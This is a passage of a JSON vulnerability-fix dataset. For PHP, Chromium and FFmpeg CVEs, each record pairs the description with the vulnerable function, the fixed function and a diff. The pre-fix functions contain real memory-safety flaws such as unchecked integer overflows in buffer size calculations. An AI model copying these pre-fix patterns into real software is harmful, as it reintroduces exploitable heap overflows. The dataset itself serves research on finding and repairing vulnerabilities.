1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}",
        "func": "static php_stream *phar_make_dirstream(char *dir, HashTable *manifest TSRMLS_DC) /* {{{ */\n{\n\tHashTable *data;\n\tint dirlen = strlen(dir);\n\tphar_zstr key;\n\tchar *entry, *found, *save, *str_key;\n\tuint keylen;\n\tulong unused;\n\n\tALLOC_HASHTABLE(data);\n\tzend_hash_init(data, 64, zend_get_hash_value, NULL, 0);\n\n\tif ((*dir == '/' && dirlen == 1 && (manifest->nNumOfElements == 0)) || (dirlen >= sizeof(\".phar\")-1 && !memcmp(dir, \".phar\", sizeof(\".phar\")-1))) {\n\t\t/* make empty root directory for empty phar */\n\t\t/* make empty directory for .phar magic directory */\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n\n\tzend_hash_internal_pointer_reset(manifest);\n\n\twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n\t\t\tbreak;\n\t\t}\n\n\t\tPHAR_STR(key, str_key);\n\n\t\tif (keylen <= (uint)dirlen) {\n\t\t\tif (keylen < (uint)dirlen || !strncmp(str_key, dir, dirlen)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\n\t\tif (*dir == '/') {\n\t\t\t/* root directory */\n\t\t\tif (keylen >= sizeof(\".phar\")-1 && !memcmp(str_key, \".phar\", sizeof(\".phar\")-1)) {\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t/* do not add any magic entries to this directory */\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t}\n\n\t\t\tif (NULL != (found = (char *) memchr(str_key, '/', keylen))) {\n\t\t\t\t/* the entry has a path separator and is a subdirectory */\n\t\t\t\tentry = (char *) safe_emalloc(found - str_key, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, found - str_key);\n\t\t\t\tkeylen = found - str_key;\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t} else {\n\t\t\t\tentry = (char *) safe_emalloc(keylen, 1, 1);\n\t\t\t\tmemcpy(entry, str_key, keylen);\n\t\t\t\tentry[keylen] = '\\0';\n\t\t\t}\n\n\t\t\tPHAR_STR_FREE(str_key);\n\t\t\tgoto PHAR_ADD_ENTRY;\n\t\t} else {\n\t\t\tif (0 != memcmp(str_key, dir, dirlen)) {\n\t\t\t\t/* entry in directory not found */\n\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tcontinue;\n\t\t\t} else {\n\t\t\t\tif (str_key[dirlen] != '/') {\n\t\t\t\t\tPHAR_STR_FREE(str_key);\n\t\t\t\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\t\t\t\tbreak;\n\t\t\t\t\t}\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\tsave = str_key;\n\t\tsave += dirlen + 1; /* seek to just past the path separator */\n\n\t\tif (NULL != (found = (char *) memchr(save, '/', keylen - dirlen - 1))) {\n\t\t\t/* is subdirectory */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(found - save + dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, found - save - dirlen - 1);\n\t\t\tkeylen = found - save - dirlen - 1;\n\t\t\tentry[keylen] = '\\0';\n\t\t} else {\n\t\t\t/* is file */\n\t\t\tsave -= dirlen + 1;\n\t\t\tentry = (char *) safe_emalloc(keylen - dirlen, 1, 1);\n\t\t\tmemcpy(entry, save + dirlen + 1, keylen - dirlen - 1);\n\t\t\tentry[keylen - dirlen - 1] = '\\0';\n\t\t\tkeylen = keylen - dirlen - 1;\n\t\t}\n\t\tPHAR_STR_FREE(str_key);\nPHAR_ADD_ENTRY:\n\t\tif (keylen) {\n\t\t\tphar_add_empty(data, entry, keylen);\n\t\t}\n\n\t\tefree(entry);\n\n\t\tif (SUCCESS != zend_hash_move_forward(manifest)) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (FAILURE != zend_hash_has_more_elements(data)) {\n\t\tefree(dir);\n\t\tif (zend_hash_sort(data, zend_qsort, phar_compare_dir_name, 0 TSRMLS_CC) == FAILURE) {\n\t\t\tFREE_HASHTABLE(data);\n\t\t\treturn NULL;\n\t\t}\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t} else {\n\t\tefree(dir);\n\t\treturn php_stream_alloc(&phar_dir_ops, data, NULL, \"r\");\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -20,7 +20,7 @@\n \tzend_hash_internal_pointer_reset(manifest);\n \n \twhile (FAILURE != zend_hash_has_more_elements(manifest)) {\n-\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n+\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {\n \t\t\tbreak;\n \t\t}\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tif (HASH_KEY_IS_STRING != zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {"
            ],
            "added_lines": [
                "\t\tif (HASH_KEY_NON_EXISTENT == zend_hash_get_current_key_ex(manifest, &key, &keylen, &unused, 0, NULL)) {"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-8664",
        "func_name": "chromium/WebCursor::Deserialize",
        "description": "Integer overflow in the WebCursor::Deserialize function in content/common/cursors/webcursor.cc in Google Chrome before 47.0.2526.106 allows remote attackers to cause a denial of service or possibly have unspecified other impact via an RGBA pixel array with crafted dimensions, a different vulnerability than CVE-2015-6792.",
        "git_url": "https://chromium.googlesource.com/chromium/src/+/4daf403ca4dfcfbce6a40574bf3da6b7fec9342f",
        "commit_title": "Fix an overflow in WebCursor.",
        "commit_text": " I also added log message just in case a user has an issue with erroneous but unmalicious web cursor.    ",
        "func_before": "bool WebCursor::Deserialize(base::PickleIterator* iter) {\n  int type, hotspot_x, hotspot_y, size_x, size_y, data_len;\n  float scale;\n  const char* data;\n\n  // Leave |this| unmodified unless we are going to return success.\n  if (!iter->ReadInt(&type) ||\n      !iter->ReadInt(&hotspot_x) ||\n      !iter->ReadInt(&hotspot_y) ||\n      !iter->ReadLength(&size_x) ||\n      !iter->ReadLength(&size_y) ||\n      !iter->ReadFloat(&scale) ||\n      !iter->ReadData(&data, &data_len))\n    return false;\n\n  // Ensure the size is sane, and there is enough data.\n  if (size_x > kMaxCursorDimension ||\n      size_y > kMaxCursorDimension)\n    return false;\n\n  // Ensure scale isn't ridiculous, and the scaled image size is still sane.\n  if (scale < 0.01 || scale > 100 ||\n      size_x / scale > kMaxCursorDimension ||\n      size_y / scale > kMaxCursorDimension)\n    return false;\n\n  type_ = type;\n\n  if (type == WebCursorInfo::TypeCustom) {\n    if (size_x > 0 && size_y > 0) {\n      // The * 4 is because the expected format is an array of RGBA pixel\n      // values.\n      if (size_x * size_y * 4 > data_len)\n        return false;\n\n      hotspot_.set_x(hotspot_x);\n      hotspot_.set_y(hotspot_y);\n      custom_size_.set_width(size_x);\n      custom_size_.set_height(size_y);\n      custom_scale_ = scale;\n      ClampHotspot();\n\n      custom_data_.clear();\n      if (data_len > 0) {\n        custom_data_.resize(data_len);\n        memcpy(&custom_data_[0], data, data_len);\n      }\n    }\n  }\n  return DeserializePlatformData(iter);\n}",
        "func": "bool WebCursor::Deserialize(base::PickleIterator* iter) {\n  int type, hotspot_x, hotspot_y, size_x, size_y, data_len;\n  float scale;\n  const char* data;\n\n  // Leave |this| unmodified unless we are going to return success.\n  if (!iter->ReadInt(&type) ||\n      !iter->ReadInt(&hotspot_x) ||\n      !iter->ReadInt(&hotspot_y) ||\n      !iter->ReadLength(&size_x) ||\n      !iter->ReadLength(&size_y) ||\n      !iter->ReadFloat(&scale) ||\n      !iter->ReadData(&data, &data_len))\n    return false;\n\n  // Ensure the size is sane, and there is enough data.\n  if (size_x > kMaxCursorDimension ||\n      size_y > kMaxCursorDimension)\n    return false;\n\n  // Ensure scale isn't ridiculous, and the scaled image size is still sane.\n  if (scale < 0.01 || scale > 100 ||\n      size_x / scale > kMaxCursorDimension ||\n      size_y / scale > kMaxCursorDimension)\n    return false;\n\n  type_ = type;\n\n  if (type == WebCursorInfo::TypeCustom) {\n    if (size_x > 0 && size_y > 0) {\n      // The * 4 is because the expected format is an array of RGBA pixel\n      // values.\n      if (size_x * size_y * 4 != data_len) {\n        LOG(WARNING) << \"WebCursor's data length and image size mismatch: \"\n                     << size_x << \"x\" << size_y << \"x4 != \"\n                     << data_len;\n        return false;\n      }\n\n      hotspot_.set_x(hotspot_x);\n      hotspot_.set_y(hotspot_y);\n      custom_size_.set_width(size_x);\n      custom_size_.set_height(size_y);\n      custom_scale_ = scale;\n      ClampHotspot();\n\n      custom_data_.clear();\n      if (data_len > 0) {\n        custom_data_.resize(data_len);\n        memcpy(&custom_data_[0], data, data_len);\n      }\n    }\n  }\n  return DeserializePlatformData(iter);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -30,8 +30,12 @@\n     if (size_x > 0 && size_y > 0) {\n       // The * 4 is because the expected format is an array of RGBA pixel\n       // values.\n-      if (size_x * size_y * 4 > data_len)\n+      if (size_x * size_y * 4 != data_len) {\n+        LOG(WARNING) << \"WebCursor's data length and image size mismatch: \"\n+                     << size_x << \"x\" << size_y << \"x4 != \"\n+                     << data_len;\n         return false;\n+      }\n \n       hotspot_.set_x(hotspot_x);\n       hotspot_.set_y(hotspot_y);",
        "diff_line_info": {
            "deleted_lines": [
                "      if (size_x * size_y * 4 > data_len)"
            ],
            "added_lines": [
                "      if (size_x * size_y * 4 != data_len) {",
                "        LOG(WARNING) << \"WebCursor's data length and image size mismatch: \"",
                "                     << size_x << \"x\" << size_y << \"x4 != \"",
                "                     << data_len;",
                "      }"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-1904",
        "func_name": "php/php-src/php_escape_shell_arg",
        "description": "Multiple integer overflows in ext/standard/exec.c in PHP 7.x before 7.0.2 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a long string to the (1) php_escape_shell_cmd or (2) php_escape_shell_arg function, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/2871c70efaaaa0f102557a17c727fd4d5204dd4b",
        "commit_title": "Patch for Heap Buffer Overflow in EscapeShell",
        "commit_text": " Proposed patch for bug #71270",
        "func_before": "PHPAPI zend_string *php_escape_shell_arg(char *str)\n{\n\tint x, y = 0, l = (int)strlen(str);\n\tzend_string *cmd;\n\tsize_t estimate = (4 * l) + 3;\n\n\n\tcmd = zend_string_alloc(4 * l + 2, 0); /* worst case */\n\n#ifdef PHP_WIN32\n\tZSTR_VAL(cmd)[y++] = '\"';\n#else\n\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\n\tfor (x = 0; x < l; x++) {\n\t\tint mb_len = php_mblen(str + x, (l - x));\n\n\t\t/* skip non-valid multibyte characters */\n\t\tif (mb_len < 0) {\n\t\t\tcontinue;\n\t\t} else if (mb_len > 1) {\n\t\t\tmemcpy(ZSTR_VAL(cmd) + y, str + x, mb_len);\n\t\t\ty += mb_len;\n\t\t\tx += mb_len - 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tswitch (str[x]) {\n#ifdef PHP_WIN32\n\t\tcase '\"':\n\t\tcase '%':\n\t\tcase '!':\n\t\t\tZSTR_VAL(cmd)[y++] = ' ';\n\t\t\tbreak;\n#else\n\t\tcase '\\'':\n\t\t\tZSTR_VAL(cmd)[y++] = '\\'';\n\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\t\t\t/* fall-through */\n\t\tdefault:\n\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\t\t}\n\t}\n#ifdef PHP_WIN32\n\tif (y > 0 && '\\\\' == ZSTR_VAL(cmd)[y - 1]) {\n\t\tint k = 0, n = y - 1;\n\t\tfor (; n >= 0 && '\\\\' == ZSTR_VAL(cmd)[n]; n--, k++);\n\t\tif (k % 2) {\n\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t}\n\t}\n\n\tZSTR_VAL(cmd)[y++] = '\"';\n#else\n\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\tZSTR_VAL(cmd)[y] = '\\0';\n\n\tif ((estimate - y) > 4096) {\n\t\t/* realloc if the estimate was way overill\n\t\t * Arbitrary cutoff point of 4096 */\n\t\tcmd = zend_string_truncate(cmd, y, 0);\n\t}\n\tZSTR_LEN(cmd) = y;\n\treturn cmd;\n}",
        "func": "PHPAPI zend_string *php_escape_shell_arg(char *str)\n{\n\tint x, y = 0, l = (int)strlen(str);\n\tzend_string *cmd;\n\tsize_t estimate = (4 * l) + 3;\n\n\n\tcmd = zend_string_safe_alloc(4, l, 2, 0); /* worst case */\n\n#ifdef PHP_WIN32\n\tZSTR_VAL(cmd)[y++] = '\"';\n#else\n\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\n\tfor (x = 0; x < l; x++) {\n\t\tint mb_len = php_mblen(str + x, (l - x));\n\n\t\t/* skip non-valid multibyte characters */\n\t\tif (mb_len < 0) {\n\t\t\tcontinue;\n\t\t} else if (mb_len > 1) {\n\t\t\tmemcpy(ZSTR_VAL(cmd) + y, str + x, mb_len);\n\t\t\ty += mb_len;\n\t\t\tx += mb_len - 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tswitch (str[x]) {\n#ifdef PHP_WIN32\n\t\tcase '\"':\n\t\tcase '%':\n\t\tcase '!':\n\t\t\tZSTR_VAL(cmd)[y++] = ' ';\n\t\t\tbreak;\n#else\n\t\tcase '\\'':\n\t\t\tZSTR_VAL(cmd)[y++] = '\\'';\n\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\t\t\t/* fall-through */\n\t\tdefault:\n\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\t\t}\n\t}\n#ifdef PHP_WIN32\n\tif (y > 0 && '\\\\' == ZSTR_VAL(cmd)[y - 1]) {\n\t\tint k = 0, n = y - 1;\n\t\tfor (; n >= 0 && '\\\\' == ZSTR_VAL(cmd)[n]; n--, k++);\n\t\tif (k % 2) {\n\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t}\n\t}\n\n\tZSTR_VAL(cmd)[y++] = '\"';\n#else\n\tZSTR_VAL(cmd)[y++] = '\\'';\n#endif\n\tZSTR_VAL(cmd)[y] = '\\0';\n\n\tif ((estimate - y) > 4096) {\n\t\t/* realloc if the estimate was way overill\n\t\t * Arbitrary cutoff point of 4096 */\n\t\tcmd = zend_string_truncate(cmd, y, 0);\n\t}\n\tZSTR_LEN(cmd) = y;\n\treturn cmd;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n \tsize_t estimate = (4 * l) + 3;\n \n \n-\tcmd = zend_string_alloc(4 * l + 2, 0); /* worst case */\n+\tcmd = zend_string_safe_alloc(4, l, 2, 0); /* worst case */\n \n #ifdef PHP_WIN32\n \tZSTR_VAL(cmd)[y++] = '\"';",
        "diff_line_info": {
            "deleted_lines": [
                "\tcmd = zend_string_alloc(4 * l + 2, 0); /* worst case */"
            ],
            "added_lines": [
                "\tcmd = zend_string_safe_alloc(4, l, 2, 0); /* worst case */"
            ]
        }
    },
    {
        "cve_id": "CVE-2016-1904",
        "func_name": "php/php-src/php_escape_shell_cmd",
        "description": "Multiple integer overflows in ext/standard/exec.c in PHP 7.x before 7.0.2 allow remote attackers to cause a denial of service or possibly have unspecified other impact via a long string to the (1) php_escape_shell_cmd or (2) php_escape_shell_arg function, leading to a heap-based buffer overflow.",
        "git_url": "https://github.com/php/php-src/commit/2871c70efaaaa0f102557a17c727fd4d5204dd4b",
        "commit_title": "Patch for Heap Buffer Overflow in EscapeShell",
        "commit_text": " Proposed patch for bug #71270",
        "func_before": "PHPAPI zend_string *php_escape_shell_cmd(char *str)\n{\n\tregister int x, y, l = (int)strlen(str);\n\tsize_t estimate = (2 * l) + 1;\n\tzend_string *cmd;\n#ifndef PHP_WIN32\n\tchar *p = NULL;\n#endif\n\n\n\tcmd = zend_string_alloc(2 * l, 0);\n\n\tfor (x = 0, y = 0; x < l; x++) {\n\t\tint mb_len = php_mblen(str + x, (l - x));\n\n\t\t/* skip non-valid multibyte characters */\n\t\tif (mb_len < 0) {\n\t\t\tcontinue;\n\t\t} else if (mb_len > 1) {\n\t\t\tmemcpy(ZSTR_VAL(cmd) + y, str + x, mb_len);\n\t\t\ty += mb_len;\n\t\t\tx += mb_len - 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tswitch (str[x]) {\n#ifndef PHP_WIN32\n\t\t\tcase '\"':\n\t\t\tcase '\\'':\n\t\t\t\tif (!p && (p = memchr(str + x + 1, str[x], l - x - 1))) {\n\t\t\t\t\t/* noop */\n\t\t\t\t} else if (p && *p == str[x]) {\n\t\t\t\t\tp = NULL;\n\t\t\t\t} else {\n\t\t\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t\t\t}\n\t\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\t\t\t\tbreak;\n#else\n\t\t\t/* % is Windows specific for environmental variables, ^%PATH% will \n\t\t\t\toutput PATH while ^%PATH^% will not. escapeshellcmd->val will escape all % and !.\n\t\t\t*/\n\t\t\tcase '%':\n\t\t\tcase '!':\n\t\t\tcase '\"':\n\t\t\tcase '\\'':\n#endif\n\t\t\tcase '#': /* This is character-set independent */\n\t\t\tcase '&':\n\t\t\tcase ';':\n\t\t\tcase '`':\n\t\t\tcase '|':\n\t\t\tcase '*':\n\t\t\tcase '?':\n\t\t\tcase '~':\n\t\t\tcase '<':\n\t\t\tcase '>':\n\t\t\tcase '^':\n\t\t\tcase '(':\n\t\t\tcase ')':\n\t\t\tcase '[':\n\t\t\tcase ']':\n\t\t\tcase '{':\n\t\t\tcase '}':\n\t\t\tcase '$':\n\t\t\tcase '\\\\':\n\t\t\tcase '\\x0A': /* excluding these two */\n\t\t\tcase '\\xFF':\n#ifdef PHP_WIN32\n\t\t\t\tZSTR_VAL(cmd)[y++] = '^';\n#else\n\t\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n#endif\n\t\t\t\t/* fall-through */\n\t\t\tdefault:\n\t\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\n\t\t}\n\t}\n\tZSTR_VAL(cmd)[y] = '\\0';\n\n\tif ((estimate - y) > 4096) {\n\t\t/* realloc if the estimate was way overill\n\t\t * Arbitrary cutoff point of 4096 */\n\t\tcmd = zend_string_truncate(cmd, y, 0);\n\t}\n\n\tZSTR_LEN(cmd) = y;\n\n\treturn cmd;\n}",
        "func": "PHPAPI zend_string *php_escape_shell_cmd(char *str)\n{\n\tregister int x, y, l = (int)strlen(str);\n\tsize_t estimate = (2 * l) + 1;\n\tzend_string *cmd;\n#ifndef PHP_WIN32\n\tchar *p = NULL;\n#endif\n\n\n\tcmd = zend_string_safe_alloc(2, l, 0, 0);\n\n\tfor (x = 0, y = 0; x < l; x++) {\n\t\tint mb_len = php_mblen(str + x, (l - x));\n\n\t\t/* skip non-valid multibyte characters */\n\t\tif (mb_len < 0) {\n\t\t\tcontinue;\n\t\t} else if (mb_len > 1) {\n\t\t\tmemcpy(ZSTR_VAL(cmd) + y, str + x, mb_len);\n\t\t\ty += mb_len;\n\t\t\tx += mb_len - 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tswitch (str[x]) {\n#ifndef PHP_WIN32\n\t\t\tcase '\"':\n\t\t\tcase '\\'':\n\t\t\t\tif (!p && (p = memchr(str + x + 1, str[x], l - x - 1))) {\n\t\t\t\t\t/* noop */\n\t\t\t\t} else if (p && *p == str[x]) {\n\t\t\t\t\tp = NULL;\n\t\t\t\t} else {\n\t\t\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n\t\t\t\t}\n\t\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\t\t\t\tbreak;\n#else\n\t\t\t/* % is Windows specific for environmental variables, ^%PATH% will \n\t\t\t\toutput PATH while ^%PATH^% will not. escapeshellcmd->val will escape all % and !.\n\t\t\t*/\n\t\t\tcase '%':\n\t\t\tcase '!':\n\t\t\tcase '\"':\n\t\t\tcase '\\'':\n#endif\n\t\t\tcase '#': /* This is character-set independent */\n\t\t\tcase '&':\n\t\t\tcase ';':\n\t\t\tcase '`':\n\t\t\tcase '|':\n\t\t\tcase '*':\n\t\t\tcase '?':\n\t\t\tcase '~':\n\t\t\tcase '<':\n\t\t\tcase '>':\n\t\t\tcase '^':\n\t\t\tcase '(':\n\t\t\tcase ')':\n\t\t\tcase '[':\n\t\t\tcase ']':\n\t\t\tcase '{':\n\t\t\tcase '}':\n\t\t\tcase '$':\n\t\t\tcase '\\\\':\n\t\t\tcase '\\x0A': /* excluding these two */\n\t\t\tcase '\\xFF':\n#ifdef PHP_WIN32\n\t\t\t\tZSTR_VAL(cmd)[y++] = '^';\n#else\n\t\t\t\tZSTR_VAL(cmd)[y++] = '\\\\';\n#endif\n\t\t\t\t/* fall-through */\n\t\t\tdefault:\n\t\t\t\tZSTR_VAL(cmd)[y++] = str[x];\n\n\t\t}\n\t}\n\tZSTR_VAL(cmd)[y] = '\\0';\n\n\tif ((estimate - y) > 4096) {\n\t\t/* realloc if the estimate was way overill\n\t\t * Arbitrary cutoff point of 4096 */\n\t\tcmd = zend_string_truncate(cmd, y, 0);\n\t}\n\n\tZSTR_LEN(cmd) = y;\n\n\treturn cmd;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -8,7 +8,7 @@\n #endif\n \n \n-\tcmd = zend_string_alloc(2 * l, 0);\n+\tcmd = zend_string_safe_alloc(2, l, 0, 0);\n \n \tfor (x = 0, y = 0; x < l; x++) {\n \t\tint mb_len = php_mblen(str + x, (l - x));",
        "diff_line_info": {
            "deleted_lines": [
                "\tcmd = zend_string_alloc(2 * l, 0);"
            ],
            "added_lines": [
                "\tcmd = zend_string_safe_alloc(2, l, 0, 0);"
            ]
        }
    },
    {
        "cve_id": "CVE-2014-8545",
        "func_name": "ffmpeg/decode_frame",
        "description": "libavcodec/pngdec.c in FFmpeg before 2.4.2 accepts the monochrome-black format without verifying that the bits-per-pixel value is 1, which allows remote attackers to cause a denial of service (out-of-bounds access) or possibly have unspecified other impact via crafted PNG data.",
        "git_url": "http://git.videolan.org/?p=ffmpeg.git;a=commit;h=3e2b745020c2dbf0201fe7df3dad9e7e0b2e1bb6",
        "commit_title": "",
        "commit_text": "avcodec/pngdec: Check bits per pixel before setting monoblack pixel format  Fixes out of array accesses  ",
        "func_before": "static int decode_frame(AVCodecContext *avctx,\n                        void *data, int *got_frame,\n                        AVPacket *avpkt)\n{\n    PNGDecContext *const s = avctx->priv_data;\n    const uint8_t *buf     = avpkt->data;\n    int buf_size           = avpkt->size;\n    AVFrame *p;\n    AVDictionary *metadata  = NULL;\n    uint32_t tag, length;\n    int64_t sig;\n    int ret;\n\n    ff_thread_release_buffer(avctx, &s->last_picture);\n    FFSWAP(ThreadFrame, s->picture, s->last_picture);\n    p = s->picture.f;\n\n    bytestream2_init(&s->gb, buf, buf_size);\n\n    /* check signature */\n    sig = bytestream2_get_be64(&s->gb);\n    if (sig != PNGSIG &&\n        sig != MNGSIG) {\n        av_log(avctx, AV_LOG_ERROR, \"Missing png signature\\n\");\n        return AVERROR_INVALIDDATA;\n    }\n\n    s->y = s->state = 0;\n\n    /* init the zlib */\n    s->zstream.zalloc = ff_png_zalloc;\n    s->zstream.zfree  = ff_png_zfree;\n    s->zstream.opaque = NULL;\n    ret = inflateInit(&s->zstream);\n    if (ret != Z_OK) {\n        av_log(avctx, AV_LOG_ERROR, \"inflateInit returned error %d\\n\", ret);\n        return AVERROR_EXTERNAL;\n    }\n    for (;;) {\n        if (bytestream2_get_bytes_left(&s->gb) <= 0) {\n            av_log(avctx, AV_LOG_ERROR, \"%d bytes left\\n\", bytestream2_get_bytes_left(&s->gb));\n            if (   s->state & PNG_ALLIMAGE\n                && avctx->strict_std_compliance <= FF_COMPLIANCE_NORMAL)\n                goto exit_loop;\n            goto fail;\n        }\n\n        length = bytestream2_get_be32(&s->gb);\n        if (length > 0x7fffffff || length > bytestream2_get_bytes_left(&s->gb))  {\n            av_log(avctx, AV_LOG_ERROR, \"chunk too big\\n\");\n            goto fail;\n        }\n        tag = bytestream2_get_le32(&s->gb);\n        if (avctx->debug & FF_DEBUG_STARTCODE)\n            av_log(avctx, AV_LOG_DEBUG, \"png: tag=%c%c%c%c length=%u\\n\",\n                (tag & 0xff),\n                ((tag >> 8) & 0xff),\n                ((tag >> 16) & 0xff),\n                ((tag >> 24) & 0xff), length);\n        switch (tag) {\n        case MKTAG('I', 'H', 'D', 'R'):\n            if (length != 13)\n                goto fail;\n            s->width  = bytestream2_get_be32(&s->gb);\n            s->height = bytestream2_get_be32(&s->gb);\n            if (av_image_check_size(s->width, s->height, 0, avctx)) {\n                s->width = s->height = 0;\n                av_log(avctx, AV_LOG_ERROR, \"Invalid image size\\n\");\n                goto fail;\n            }\n            s->bit_depth        = bytestream2_get_byte(&s->gb);\n            s->color_type       = bytestream2_get_byte(&s->gb);\n            s->compression_type = bytestream2_get_byte(&s->gb);\n            s->filter_type      = bytestream2_get_byte(&s->gb);\n            s->interlace_type   = bytestream2_get_byte(&s->gb);\n            bytestream2_skip(&s->gb, 4); /* crc */\n            s->state |= PNG_IHDR;\n            if (avctx->debug & FF_DEBUG_PICT_INFO)\n                av_log(avctx, AV_LOG_DEBUG, \"width=%d height=%d depth=%d color_type=%d \"\n                           \"compression_type=%d filter_type=%d interlace_type=%d\\n\",\n                    s->width, s->height, s->bit_depth, s->color_type,\n                    s->compression_type, s->filter_type, s->interlace_type);\n            break;\n        case MKTAG('p', 'H', 'Y', 's'):\n            if (s->state & PNG_IDAT) {\n                av_log(avctx, AV_LOG_ERROR, \"pHYs after IDAT\\n\");\n                goto fail;\n            }\n            avctx->sample_aspect_ratio.num = bytestream2_get_be32(&s->gb);\n            avctx->sample_aspect_ratio.den = bytestream2_get_be32(&s->gb);\n            if (avctx->sample_aspect_ratio.num < 0 || avctx->sample_aspect_ratio.den < 0)\n                avctx->sample_aspect_ratio = (AVRational){ 0, 1 };\n            bytestream2_skip(&s->gb, 1); /* unit specifier */\n            bytestream2_skip(&s->gb, 4); /* crc */\n            break;\n        case MKTAG('I', 'D', 'A', 'T'):\n            if (!(s->state & PNG_IHDR)) {\n                av_log(avctx, AV_LOG_ERROR, \"IDAT without IHDR\\n\");\n                goto fail;\n            }\n            if (!(s->state & PNG_IDAT)) {\n                /* init image info */\n                avctx->width  = s->width;\n                avctx->height = s->height;\n\n                s->channels       = ff_png_get_nb_channels(s->color_type);\n                s->bits_per_pixel = s->bit_depth * s->channels;\n                s->bpp            = (s->bits_per_pixel + 7) >> 3;\n                s->row_size       = (avctx->width * s->bits_per_pixel + 7) >> 3;\n\n                if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                    s->color_type == PNG_COLOR_TYPE_RGB) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGB24;\n                } else if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_RGB_ALPHA) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGBA;\n                } else if ((s->bit_depth == 2 || s->bit_depth == 4 || s->bit_depth == 8) &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY) {\n                    avctx->pix_fmt = AV_PIX_FMT_GRAY8;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_GRAY) {\n                    avctx->pix_fmt = AV_PIX_FMT_GRAY16BE;\n                } else if (s->bit_depth == 16 &&\n                           s->color_type == PNG_COLOR_TYPE_RGB) {\n                    avctx->pix_fmt = AV_PIX_FMT_RGB48BE;\n                } else if (s->bit_depth == 16 